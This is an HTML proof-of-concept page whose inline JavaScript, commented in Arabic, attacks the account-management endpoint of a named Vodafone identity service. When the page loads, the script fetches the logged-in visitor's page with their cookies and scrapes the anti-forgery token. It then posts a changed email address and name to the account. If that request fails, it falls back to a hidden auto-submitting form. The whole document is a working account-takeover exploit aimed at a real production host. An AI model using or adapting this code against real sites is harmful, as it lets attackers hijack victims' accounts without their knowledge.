<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC Executing...</title>
</head>
<body>
    <div id="msg" style="font-family: sans-serif; font-weight: bold; padding: 20px;">Initializing...</div>

    <script>
        // المتغيرات الأساسية
        const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";

        async function executePackageDoom() {
            try {
                document.getElementById('msg').innerText = "Step 1: Sniffing Token...";
                
                // 1. سحب التوكن (GET)
                const response = await fetch(target, { method: 'GET', credentials: 'include' });
                const html = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;

                if (!token) {
                    document.getElementById('msg').innerText = "❌ Token missing! (Are you logged in to Vodafone?)";
                    return;
                }

                document.getElementById('msg').innerText = "Step 2: Token Captured! Executing CSRF Attack...";

                const newEmail = `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`;
                
                const details = {
                    'IsEmailConfirmed': 'True',
                    'Email': newEmail,
                    'PhoneNumber': '',
                    'Name': 'Xia0Checkmate',
                    'Website': '',
                    'Profile': '',
                    'StreetAddress': '',
                    'Locality': '12',
                    'Region': '',
                    'PostalCode': '',
                    'Country': '',
                    '__RequestVerificationToken': token 
                };

                // محاولة الإرسال عبر Fetch
                let formBody = [];
                for (let property in details) {
                    formBody.push(encodeURIComponent(property) + "=" + encodeURIComponent(details[property]));
                }
                formBody = formBody.join("&");

                const postRes = await fetch(target, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: formBody,
                    credentials: 'include'
                });

                // إذا فشل الـ Fetch (CORS/400)، ننتقل للفورم الصامت فوراً
                if (postRes.status === 400 || !postRes.ok) {
                    document.getElementById('msg').innerText = "⚠️ Fetch blocked. Using Fallback Form...";
                    setTimeout(() => { submitSilentForm(details); }, 1000);
                } else {
                    document.getElementById('msg').innerHTML = "<h2 style='color:green'>✅ Success! Check your account.</h2>";
                }

            } catch (err) {
                document.getElementById('msg').innerText = "❌ Error: " + err.message;
                // في حال حدوث أي خطأ، جرب الفورم كخيار أخير
                const backupEmail = `backup_${Math.random().toString(36).substring(7)}@vodafone.io`;
                // submitSilentForm({...details, Email: backupEmail}); 
            }
        }

        // دالة الفورم الصامت (القاضية)
        function submitSilentForm(data) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = target;
            for (const key in data) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = data[key];
                form.appendChild(input);
            }
            document.body.appendChild(form);
            form.submit();
        }

        // --- هاد السطر هو اللي بيشغل كل الحفلة ---
        window.onload = function() {
            executePackageDoom();
        };
    </script>
</body>
</html>
